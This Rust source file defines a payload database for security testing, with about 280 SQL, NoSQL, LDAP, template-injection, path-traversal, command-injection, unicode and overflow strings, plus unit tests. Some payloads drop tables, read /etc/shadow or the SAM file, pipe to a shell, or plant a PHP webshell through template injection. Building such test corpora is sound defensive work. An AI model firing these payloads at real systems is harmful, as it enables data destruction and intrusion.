// SPEC-MANAGED: projects/meter/tech-design/semantic/source/projects-meter-src-security-payloads-rs.md#source
// CODEGEN-BEGIN
//! Payload database for security testing
//!
//! Comprehensive collection of malicious payloads for testing input validation,
//! SQL injection prevention, and security boundaries.

/// Category of security payloads
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
/// @spec projects/meter/tech-design/semantic/source/projects-meter-src-security-payloads-rs.md#source
pub enum PayloadCategory {
    /// SQL injection attacks
    SqlInjection,
    /// Identifier-based injection (table/column names)
    IdentifierInjection,
    /// Unicode tricks and homoglyphs
    UnicodeTricks,
    /// Buffer overflow and resource exhaustion
    Overflow,
    /// NoSQL injection attacks (MongoDB-specific)
    NoSqlInjection,
    /// Path traversal attacks
    PathTraversal,
    /// OS command injection
    CommandInjection,
    /// LDAP injection attacks
    LdapInjection,
    /// Server-Side Template Injection (SSTI)
    TemplateInjection,
}

/// Database of security test payloads
#[derive(Debug)]
/// @spec projects/meter/tech-design/semantic/source/projects-meter-src-security-payloads-rs.md#source
pub struct PayloadDatabase {
    sql_injection_payloads: Vec<String>,
    identifier_injection_payloads: Vec<String>,
    unicode_trick_payloads: Vec<String>,
    overflow_payloads: Vec<String>,
    nosql_injection_payloads: Vec<String>,
    path_traversal_payloads: Vec<String>,
    command_injection_payloads: Vec<String>,
    ldap_injection_payloads: Vec<String>,
    template_injection_payloads: Vec<String>,
}

/// @spec projects/meter/tech-design/semantic/source/projects-meter-src-security-payloads-rs.md#source
impl PayloadDatabase {
    /// Create a new payload database with all payloads
    pub fn new() -> Self {
        Self {
            sql_injection_payloads: Self::init_sql_injection(),
            identifier_injection_payloads: Self::init_identifier_injection(),
            unicode_trick_payloads: Self::init_unicode_tricks(),
            overflow_payloads: Self::init_overflow(),
            nosql_injection_payloads: Self::init_nosql_injection(),
            path_traversal_payloads: Self::init_path_traversal(),
            command_injection_payloads: Self::init_command_injection(),
            ldap_injection_payloads: Self::init_ldap_injection(),
            template_injection_payloads: Self::init_template_injection(),
        }
    }

    /// Get SQL injection payloads
    pub fn sql_injection(&self) -> &[String] {
        &self.sql_injection_payloads
    }

    /// Get identifier injection payloads
    pub fn identifier_injection(&self) -> &[String] {
        &self.identifier_injection_payloads
    }

    /// Get unicode trick payloads
    pub fn unicode_tricks(&self) -> &[String] {
        &self.unicode_trick_payloads
    }

    /// Get overflow payloads
    pub fn overflow(&self) -> &[String] {
        &self.overflow_payloads
    }

    /// Get NoSQL injection payloads
    pub fn nosql_injection(&self) -> &[String] {
        &self.nosql_injection_payloads
    }

    /// Get path traversal payloads
    pub fn path_traversal(&self) -> &[String] {
        &self.path_traversal_payloads
    }

    /// Get command injection payloads
    pub fn command_injection(&self) -> &[String] {
        &self.command_injection_payloads
    }

    /// Get LDAP injection payloads
    pub fn ldap_injection(&self) -> &[String] {
        &self.ldap_injection_payloads
    }

    /// Get template injection payloads
    pub fn template_injection(&self) -> &[String] {
        &self.template_injection_payloads
    }

    /// Get payloads by category
    pub fn by_category(&self, category: PayloadCategory) -> &[String] {
        match category {
            PayloadCategory::SqlInjection => self.sql_injection(),
            PayloadCategory::IdentifierInjection => self.identifier_injection(),
            PayloadCategory::UnicodeTricks => self.unicode_tricks(),
            PayloadCategory::Overflow => self.overflow(),
            PayloadCategory::NoSqlInjection => self.nosql_injection(),
            PayloadCategory::PathTraversal => self.path_traversal(),
            PayloadCategory::CommandInjection => self.command_injection(),
            PayloadCategory::LdapInjection => self.ldap_injection(),
            PayloadCategory::TemplateInjection => self.template_injection(),
        }
    }

    /// Get all payloads
    pub fn all(&self) -> Vec<&String> {
        let mut all = Vec::new();
        all.extend(self.sql_injection_payloads.iter());
        all.extend(self.identifier_injection_payloads.iter());
        all.extend(self.unicode_trick_payloads.iter());
        all.extend(self.overflow_payloads.iter());
        all.extend(self.nosql_injection_payloads.iter());
        all.extend(self.path_traversal_payloads.iter());
        all.extend(self.command_injection_payloads.iter());
        all.extend(self.ldap_injection_payloads.iter());
        all.extend(self.template_injection_payloads.iter());
        all
    }

    /// Initialize SQL injection payloads
    fn init_sql_injection() -> Vec<String> {
        vec![
            // Classic SQL injection
            "' OR '1'='1".to_string(),
            "' OR 1=1--".to_string(),
            "' OR 1=1#".to_string(),
            "' OR 1=1/*".to_string(),
            "admin'--".to_string(),
            "admin' #".to_string(),
            "admin'/*".to_string(),
            "' or 1=1--".to_string(),
            "' or 1=1#".to_string(),
            "' or 1=1/*".to_string(),
            "') or '1'='1--".to_string(),
            "') or ('1'='1--".to_string(),
            // UNION-based injection
            "' UNION SELECT NULL--".to_string(),
            "' UNION SELECT NULL, NULL--".to_string(),
            "' UNION ALL SELECT NULL--".to_string(),
            "' UNION SELECT 1,2,3--".to_string(),
            "' UNION SELECT username, password FROM users--".to_string(),
            // Stacked queries
            "'; DROP TABLE users--".to_string(),
            "'; DELETE FROM users--".to_string(),
            "'; UPDATE users SET password='hacked'--".to_string(),
            "'; EXEC sp_MSForEachTable 'DROP TABLE ?'--".to_string(),
            // Boolean-based blind injection
            "' AND 1=1--".to_string(),
            "' AND 1=2--".to_string(),
            "' AND SLEEP(5)--".to_string(),
            "' AND BENCHMARK(10000000,MD5('A'))--".to_string(),
            // Time-based blind injection
            "'; WAITFOR DELAY '00:00:05'--".to_string(),
            "' AND SLEEP(5) AND '1'='1".to_string(),
            "' AND pg_sleep(5)--".to_string(),
            // Error-based injection
            "' AND 1=CONVERT(int,(SELECT @@version))--".to_string(),
            "' AND extractvalue(1,concat(0x7e,version()))--".to_string(),
            // Comment-based
            "--".to_string(),
            "#".to_string(),
            "/**/".to_string(),
            "/*!50000 SELECT * FROM users*/".to_string(),
            // Encoded injection
            "%27%20OR%20%271%27%3D%271".to_string(),
            "\\x27 OR 1=1--".to_string(),
            // NoSQL injection (MongoDB specific)
            "{\"$gt\": \"\"}".to_string(),
            "{\"$ne\": null}".to_string(),
            "{\"$regex\": \".*\"}".to_string(),
            "{\"$where\": \"1==1\"}".to_string(),
            "'; return true; var foo='".to_string(),
            "'; this.password != ''".to_string(),
            // Special characters
            "';--".to_string(),
            "\"--".to_string(),
            "';#".to_string(),
            "\"#".to_string(),
            // Multiple statements
            "'; SELECT * FROM users WHERE '1'='1".to_string(),
            "\"; SELECT * FROM users WHERE \"1\"=\"1".to_string(),
            // NULL byte injection
            "admin\0".to_string(),
            "admin%00".to_string(),
        ]
    }

    /// Initialize identifier injection payloads (for table/column names)
    fn init_identifier_injection() -> Vec<String> {
        vec![
            // Schema attacks
            "information_schema.tables".to_string(),
            "pg_catalog.pg_tables".to_string(),
            "sys.tables".to_string(),
            "mysql.user".to_string(),
            // Quotes and escaping
            "users'--".to_string(),
            "users\"--".to_string(),
            "`users`".to_string(),
            "[users]".to_string(),
            "\"users\"".to_string(),
            // SQL keywords as identifiers
            "SELECT".to_string(),
            "DROP".to_string(),
            "TABLE".to_string(),
            "WHERE".to_string(),
            "UNION".to_string(),
            "INSERT".to_string(),
            "DELETE".to_string(),
            "UPDATE".to_string(),
            // Special characters in identifiers
            "user$name".to_string(),
            "user.name".to_string(),
            "user name".to_string(),
            "user;name".to_string(),
            "user--name".to_string(),
            "user/**/name".to_string(),
            // Path traversal in identifiers
            "../users".to_string(),
            "../../etc/passwd".to_string(),
            "..\\..\\windows\\system32".to_string(),
            // MongoDB special operators
            "$where".to_string(),
            "$gt".to_string(),
            "$ne".to_string(),
            "$regex".to_string(),
        ]
    }

    /// Initialize unicode trick payloads
    fn init_unicode_tricks() -> Vec<String> {
        vec![
            // Homoglyphs (look-alike characters)
            "аdmin".to_string(),       // Cyrillic 'а' instead of Latin 'a'
            "аdmіn".to_string(),       // Multiple Cyrillic chars
            "ṁongodbḃase".to_string(), // Dotted characters
            // Zero-width characters
            "ad\u{200B}min".to_string(), // Zero-width space
            "ad\u{200C}min".to_string(), // Zero-width non-joiner
            "ad\u{200D}min".to_string(), // Zero-width joiner
            "ad\u{FEFF}min".to_string(), // Zero-width no-break space
            // Right-to-left override
            "admin\u{202E}niam".to_string(), // RTL override
            "\u{202E}SELECT * FROM users".to_string(),
            // Combining characters
            "a\u{0301}dmin".to_string(), // Combining acute accent
            "a\u{0300}dmin".to_string(), // Combining grave accent
            // Normalization attacks
            "ﬁle".to_string(), // Ligature fi
            "ﬀ".to_string(),   // Ligature ff
            // Control characters
            "admin\u{0000}".to_string(), // NULL
            "admin\u{0001}".to_string(), // SOH
            "admin\u{001F}".to_string(), // Unit separator
            // Bidirectional text
            "\u{061C}admin".to_string(),             // Arabic letter mark
            "admin\u{2066}test\u{2069}".to_string(), // Directional isolates
            // Additional homoglyphs
            "раssword".to_string(), // Cyrillic 'р' and 'а'
            "ехample".to_string(),  // Cyrillic 'е' and 'х'
        ]
    }

    /// Initialize overflow payloads
    fn init_overflow() -> Vec<String> {
        vec![
            // Long strings
            "A".repeat(1000),
            "A".repeat(10000),
            "A".repeat(100000),
            // Many parameters
            format!(
                "?{}",
                (0..1000)
                    .map(|i| format!("param{}=value", i))
                    .collect::<Vec<_>>()
                    .join("&")
            ),
            // Deep nesting
            "{{{{{{{{{{".to_string(),
            "[[[[[[[[[[".to_string(),
            // Repeated special chars
            "'''''''''''''''''''''''''''''''".to_string(),
            "\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"".to_string(),
            "//////////////////////////////".to_string(),
            "\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\".to_string(),
        ]
    }

    /// Initialize NoSQL injection payloads
    fn init_nosql_injection() -> Vec<String> {
        vec![
            // MongoDB operator injection
            r#"{"$gt": ""}"#.to_string(),
            r#"{"$ne": null}"#.to_string(),
            r#"{"$regex": ".*"}"#.to_string(),
            r#"{"$where": "this.password == 'password'"}"#.to_string(),
            r#"{"$where": "1==1"}"#.to_string(),
            r#"{"$where": "sleep(5000)"}"#.to_string(),

            // Array injection
            r#"{"$in": ["admin", "administrator"]}"#.to_string(),
            r#"{"$nin": []}"#.to_string(),
            r#"{"$all": []}"#.to_string(),

            // Logic operators
            r#"{"$or": [{"password": {"$ne": null}}, {"password": {"$exists": true}}]}"#.to_string(),
            r#"{"$and": [{"username": "admin"}, {"password": {"$gt": ""}}]}"#.to_string(),
            r#"{"$nor": []}"#.to_string(),

            // Aggregation pipeline injection
            r#"[{"$match": {}}, {"$group": {"_id": "$password"}}]"#.to_string(),
            r#"[{"$project": {"password": 1}}]"#.to_string(),
            r#"[{"$lookup": {"from": "users", "localField": "_id", "foreignField": "userId", "as": "userData"}}]"#.to_string(),

            // JavaScript injection
            r#"'; return true; var foo='"#.to_string(),
            r#"'; return this.password.match(/.*/)//'"#.to_string(),
            r#"'; while(true){}; var x='"#.to_string(),

            // Regex DoS
            r#"{"$regex": "^(a+)+$"}"#.to_string(),
            r#"{"$regex": "(.*a){10}"}"#.to_string(),

            // Type confusion
            r#"{"password": {"$type": 2}}"#.to_string(),
            r#"{"password": {"$type": "string"}}"#.to_string(),

            // Exists operator abuse
            r#"{"password": {"$exists": false}}"#.to_string(),
            r#"{"admin": {"$exists": true}}"#.to_string(),

            // Size operator
            r#"{"password": {"$size": 0}}"#.to_string(),
            r#"{"roles": {"$size": 1}}"#.to_string(),

            // elemMatch
            r#"{"items": {"$elemMatch": {"price": {"$gt": 0}}}}"#.to_string(),

            // Comment injection
            r#"admin' || '1'=='1' //"#.to_string(),
            r#"admin' && this.password //"#.to_string(),
        ]
    }

    /// Initialize path traversal payloads
    fn init_path_traversal() -> Vec<String> {
        vec![
            // Basic traversal
            "../".to_string(),
            "../../".to_string(),
            "../../../".to_string(),
            "../../../../".to_string(),
            "../../../../../etc/passwd".to_string(),
            "../../etc/shadow".to_string(),
            "../../../windows/win.ini".to_string(),
            "..\\..\\windows\\system32\\config\\sam".to_string(),
            // Absolute paths
            "/etc/passwd".to_string(),
            "/etc/shadow".to_string(),
            "C:\\windows\\system32\\config\\sam".to_string(),
            "C:\\boot.ini".to_string(),
            // URL encoded
            "..%2F".to_string(),
            "..%2F..%2F".to_string(),
            "..%2F..%2F..%2Fetc%2Fpasswd".to_string(),
            "%2e%2e%2f".to_string(),
            "%2e%2e/%2e%2e/%2e%2e/etc/passwd".to_string(),
            // Double encoding
            "..%252F".to_string(),
            "..%252F..%252F..%252Fetc%252Fpasswd".to_string(),
            // Unicode encoding
            "..%c0%af".to_string(),
            "..%c1%9c".to_string(),
            // Null bytes
            "../../../etc/passwd%00".to_string(),
            "../../../etc/passwd\0.jpg".to_string(),
            // Mixed slashes
            "..\\../..\\../etc/passwd".to_string(),
            "....//....//etc/passwd".to_string(),
            "....\\\\....\\\\windows\\system32".to_string(),
            // Dot variations
            ".../.../etc/passwd".to_string(),
            "./.././../etc/passwd".to_string(),
            // Case variations (Windows)
            "..\\..\\..\\WiNdOwS\\sYsTeM32\\CoNfIg\\SaM".to_string(),
            // Special files
            "/proc/self/environ".to_string(),
            "/proc/self/cmdline".to_string(),
            "/proc/version".to_string(),
            "/var/log/apache2/access.log".to_string(),
            "/var/log/nginx/error.log".to_string(),
        ]
    }

    /// Initialize command injection payloads
    fn init_command_injection() -> Vec<String> {
        vec![
            // Basic shell metacharacters
            "; ls".to_string(),
            "| ls".to_string(),
            "& ls".to_string(),
            "&& ls".to_string(),
            "|| ls".to_string(),
            // Command substitution
            "$(ls)".to_string(),
            "`ls`".to_string(),
            "$(whoami)".to_string(),
            "`whoami`".to_string(),
            "$(cat /etc/passwd)".to_string(),
            // Newline injection
            "%0als".to_string(),
            "%0dls".to_string(),
            "\nls".to_string(),
            "\rls".to_string(),
            // Multiple commands
            "; cat /etc/passwd; ls".to_string(),
            "| cat /etc/passwd | ls".to_string(),
            "&& cat /etc/passwd && ls".to_string(),
            // Redirection
            "> /tmp/output".to_string(),
            ">> /tmp/output".to_string(),
            "< /etc/passwd".to_string(),
            // Pipe to shell
            "| /bin/sh".to_string(),
            "| /bin/bash".to_string(),
            "| cmd.exe".to_string(),
            "| powershell.exe".to_string(),
            // Time-based detection
            "; sleep 5".to_string(),
            "| sleep 5".to_string(),
            "& ping -c 5 127.0.0.1".to_string(),
            "&& timeout 5".to_string(),
            // Encoded
            ";%20ls".to_string(),
            "|%20ls".to_string(),
            "&%20ls".to_string(),
            // Wildcards
            "; ls *".to_string(),
            "| cat *.txt".to_string(),
            "& find / -name *.conf".to_string(),
            // Environment variables
            "; echo $PATH".to_string(),
            "| printenv".to_string(),
            "&& env".to_string(),
            // Common commands
            "; id".to_string(),
            "| uname -a".to_string(),
            "&& cat /etc/hosts".to_string(),
        ]
    }

    /// Initialize LDAP injection payloads
    fn init_ldap_injection() -> Vec<String> {
        vec![
            // Basic LDAP injection
            "*".to_string(),
            "admin*".to_string(),
            "*)(uid=*)".to_string(),
            "*)(|(uid=*".to_string(),
            // Filter injection
            "*)(&".to_string(),
            "*))%00".to_string(),
            "*()|%00".to_string(),
            "*()|&'".to_string(),
            // OR logic injection
            ")(|(uid=*".to_string(),
            ")(|(objectClass=*".to_string(),
            "*)(|(password=*)".to_string(),
            // AND logic injection
            "*)(&(uid=*".to_string(),
            "*)(&(password=*".to_string(),
            // Blind LDAP injection
            "admin)(&(1=1".to_string(),
            "admin)(&(1=2".to_string(),
            // Comment injection
            "admin)%00".to_string(),
            "admin))%00".to_string(),
            // Attribute extraction
            "*)(cn=*".to_string(),
            "*)(sn=*".to_string(),
            "*)(mail=*".to_string(),
            // DN injection
            "cn=admin,dc=example,dc=com".to_string(),
            ",dc=example,dc=com".to_string(),
            "cn=*,dc=*".to_string(),
            // Escape bypass
            "\\2A(uid=\\2A)".to_string(),
            "\\28uid=\\2A\\29".to_string(),
        ]
    }

    /// Initialize template injection payloads
    fn init_template_injection() -> Vec<String> {
        vec![
            // Jinja2
            "{{7*7}}".to_string(),
            "{{config}}".to_string(),
            "{{''.__class__.__mro__[2].__subclasses__()}}".to_string(),
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}".to_string(),

            // Django
            "{% debug %}".to_string(),
            "{% load module %}".to_string(),
            "{{ settings.SECRET_KEY }}".to_string(),

            // ERB (Ruby)
            "<%= 7*7 %>".to_string(),
            "<%= system('ls') %>".to_string(),
            "<%= `ls` %>".to_string(),
            "<%= File.open('/etc/passwd').read %>".to_string(),

            // Handlebars
            "{{#with \"s\" as |string|}}{{#with \"e\"}}{{lookup string.constructor.prototype 'constructor'}}{{/with}}{{/with}}".to_string(),

            // Freemarker
            "${7*7}".to_string(),
            "<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"id\") }".to_string(),

            // Velocity
            "#set($x=7*7)$x".to_string(),
            "#set($e=\"e\")#set($c=$e.class.forName(\"java.lang.Runtime\"))".to_string(),

            // Smarty
            "{php}echo `id`;{/php}".to_string(),
            "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php passthru($_GET['cmd']); ?>\",self::clearConfig())}".to_string(),

            // Twig
            "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}".to_string(),

            // Pug/Jade
            "#{7*7}".to_string(),
            "#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad(\"child_process\").exec('ls')}()}".to_string(),

            // AngularJS
            "{{constructor.constructor('alert(1)')()}}".to_string(),

            // Tornado
            "{% import os %}{{os.system('ls')}}".to_string(),

            // Expression language
            "${7*7}".to_string(),
            "${{7*7}}".to_string(),
            "#{7*7}".to_string(),

            // Polyglot
            "${{<%[%'\"}}%\\.".to_string(),
        ]
    }
}

/// @spec projects/meter/tech-design/semantic/source/projects-meter-src-security-payloads-rs.md#source
impl Default for PayloadDatabase {
    fn default() -> Self {
        Self::new()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_payload_database_creation() {
        let db = PayloadDatabase::new();
        assert!(!db.sql_injection().is_empty());
        assert!(!db.identifier_injection().is_empty());
        assert!(!db.unicode_tricks().is_empty());
        assert!(!db.overflow().is_empty());
    }

    #[test]
    fn test_sql_injection_payloads_count() {
        let db = PayloadDatabase::new();
        let payloads = db.sql_injection();
        assert!(
            payloads.len() >= 50,
            "Should have at least 50 SQL injection payloads"
        );
    }

    #[test]
    fn test_identifier_injection_payloads_count() {
        let db = PayloadDatabase::new();
        let payloads = db.identifier_injection();
        assert!(
            payloads.len() >= 30,
            "Should have at least 30 identifier injection payloads"
        );
    }

    #[test]
    fn test_unicode_tricks_payloads_count() {
        let db = PayloadDatabase::new();
        let payloads = db.unicode_tricks();
        assert!(
            payloads.len() >= 20,
            "Should have at least 20 unicode trick payloads"
        );
    }

    #[test]
    fn test_overflow_payloads_count() {
        let db = PayloadDatabase::new();
        let payloads = db.overflow();
        assert!(
            payloads.len() >= 10,
            "Should have at least 10 overflow payloads"
        );
    }

    #[test]
    fn test_by_category() {
        let db = PayloadDatabase::new();

        let sql = db.by_category(PayloadCategory::SqlInjection);
        assert_eq!(sql.len(), db.sql_injection().len());

        let identifier = db.by_category(PayloadCategory::IdentifierInjection);
        assert_eq!(identifier.len(), db.identifier_injection().len());

        let unicode = db.by_category(PayloadCategory::UnicodeTricks);
        assert_eq!(unicode.len(), db.unicode_tricks().len());

        let overflow = db.by_category(PayloadCategory::Overflow);
        assert_eq!(overflow.len(), db.overflow().len());
    }

    #[test]
    fn test_all_payloads() {
        let db = PayloadDatabase::new();
        let all = db.all();

        let expected_total = db.sql_injection().len()
            + db.identifier_injection().len()
            + db.unicode_tricks().len()
            + db.overflow().len()
            + db.nosql_injection().len()
            + db.path_traversal().len()
            + db.command_injection().len()
            + db.ldap_injection().len()
            + db.template_injection().len();

        assert_eq!(all.len(), expected_total);
    }

    #[test]
    fn test_sql_injection_contains_classic_attacks() {
        let db = PayloadDatabase::new();
        let payloads = db.sql_injection();

        // Check for classic SQL injection patterns
        assert!(payloads.iter().any(|p| p.contains("OR '1'='1")));
        assert!(payloads.iter().any(|p| p.contains("DROP TABLE")));
        assert!(payloads.iter().any(|p| p.contains("UNION SELECT")));
    }

    #[test]
    fn test_nosql_injection_in_sql_category() {
        let db = PayloadDatabase::new();
        let payloads = db.sql_injection();

        // Check for NoSQL injection patterns that are in the SQL injection category
        // (these are legacy payloads kept for backwards compatibility)
        assert!(payloads.iter().any(|p| p.contains("$gt")));
        assert!(payloads.iter().any(|p| p.contains("$ne")));
        assert!(payloads.iter().any(|p| p.contains("$where")));
    }

    #[test]
    fn test_identifier_contains_schema_attacks() {
        let db = PayloadDatabase::new();
        let payloads = db.identifier_injection();

        assert!(payloads.iter().any(|p| p.contains("information_schema")));
        assert!(payloads.iter().any(|p| p.contains("$where")));
    }

    #[test]
    fn test_unicode_contains_homoglyphs() {
        let db = PayloadDatabase::new();
        let payloads = db.unicode_tricks();

        // Check for zero-width characters
        assert!(payloads.iter().any(|p| p.contains('\u{200B}')));
        // Check for RTL override
        assert!(payloads.iter().any(|p| p.contains('\u{202E}')));
    }

    #[test]
    fn test_overflow_contains_long_strings() {
        let db = PayloadDatabase::new();
        let payloads = db.overflow();

        // Check for very long strings
        assert!(payloads.iter().any(|p| p.len() > 10000));
    }

    #[test]
    fn test_payload_categories() {
        assert_eq!(PayloadCategory::SqlInjection, PayloadCategory::SqlInjection);
        assert_ne!(
            PayloadCategory::SqlInjection,
            PayloadCategory::IdentifierInjection
        );
    }

    #[test]
    fn test_default_implementation() {
        let db1 = PayloadDatabase::default();
        let db2 = PayloadDatabase::new();

        assert_eq!(db1.sql_injection().len(), db2.sql_injection().len());
        assert_eq!(
            db1.identifier_injection().len(),
            db2.identifier_injection().len()
        );
    }

    #[test]
    fn test_nosql_injection_payloads() {
        let db = PayloadDatabase::new();
        let payloads = db.nosql_injection();
        assert!(
            payloads.len() >= 25,
            "Should have at least 25 NoSQL injection payloads"
        );
        assert!(payloads.iter().any(|p| p.contains("$where")));
        assert!(payloads.iter().any(|p| p.contains("$regex")));
        assert!(payloads.iter().any(|p| p.contains("$or")));
    }

    #[test]
    fn test_path_traversal_payloads() {
        let db = PayloadDatabase::new();
        let payloads = db.path_traversal();
        assert!(
            payloads.len() >= 30,
            "Should have at least 30 path traversal payloads"
        );
        assert!(payloads.iter().any(|p| p.contains("../")));
        assert!(payloads.iter().any(|p| p.contains("/etc/passwd")));
        assert!(payloads.iter().any(|p| p.contains("%2F")));
    }

    #[test]
    fn test_command_injection_payloads() {
        let db = PayloadDatabase::new();
        let payloads = db.command_injection();
        assert!(
            payloads.len() >= 35,
            "Should have at least 35 command injection payloads"
        );
        assert!(payloads.iter().any(|p| p.contains(";")));
        assert!(payloads.iter().any(|p| p.contains("|")));
        assert!(payloads.iter().any(|p| p.contains("&&")));
    }

    #[test]
    fn test_ldap_injection_payloads() {
        let db = PayloadDatabase::new();
        let payloads = db.ldap_injection();
        assert!(
            payloads.len() >= 20,
            "Should have at least 20 LDAP injection payloads"
        );
        assert!(payloads.iter().any(|p| p.contains("*")));
        assert!(payloads.iter().any(|p| p.contains(")(")));
        assert!(payloads.iter().any(|p| p.contains("uid")));
    }

    #[test]
    fn test_template_injection_payloads() {
        let db = PayloadDatabase::new();
        let payloads = db.template_injection();
        assert!(
            payloads.len() >= 25,
            "Should have at least 25 template injection payloads"
        );
        assert!(payloads.iter().any(|p| p.contains("{{")));
        assert!(payloads.iter().any(|p| p.contains("<%=")));
        assert!(payloads.iter().any(|p| p.contains("${{")));
    }

    #[test]
    fn test_new_categories_in_by_category() {
        let db = PayloadDatabase::new();
        assert!(!db.by_category(PayloadCategory::NoSqlInjection).is_empty());
        assert!(!db.by_category(PayloadCategory::PathTraversal).is_empty());
        assert!(!db.by_category(PayloadCategory::CommandInjection).is_empty());
        assert!(!db.by_category(PayloadCategory::LdapInjection).is_empty());
        assert!(!db
            .by_category(PayloadCategory::TemplateInjection)
            .is_empty());
    }

    #[test]
    fn test_total_payload_count_increased() {
        let db = PayloadDatabase::new();
        let all_payloads = db.all();
        // Original categories: ~120 payloads
        // New categories: ~160 payloads (30+35+40+27+28)
        // Total: ~280 payloads
        assert!(
            all_payloads.len() >= 250,
            "Should have at least 250 total payloads, got {}",
            all_payloads.len()
        );
    }

    #[test]
    fn test_all_categories_represented() {
        let db = PayloadDatabase::new();

        // Test that all categories are represented in the all() method
        let all = db.all();

        // Check for presence of payloads from each category
        let has_sql = all.iter().any(|p| p.contains("OR '1'='1"));
        let has_nosql = all.iter().any(|p| p.contains("$where"));
        let has_path = all.iter().any(|p| p.contains("../"));
        let has_cmd = all.iter().any(|p| p.contains("; ls"));
        let has_ldap = all.iter().any(|p| p.contains("*)(uid="));
        let has_template = all.iter().any(|p| p.contains("{{7*7}}"));

        assert!(has_sql, "SQL injection payloads not found in all()");
        assert!(has_nosql, "NoSQL injection payloads not found in all()");
        assert!(has_path, "Path traversal payloads not found in all()");
        assert!(has_cmd, "Command injection payloads not found in all()");
        assert!(has_ldap, "LDAP injection payloads not found in all()");
        assert!(
            has_template,
            "Template injection payloads not found in all()"
        );
    }
}
// CODEGEN-END
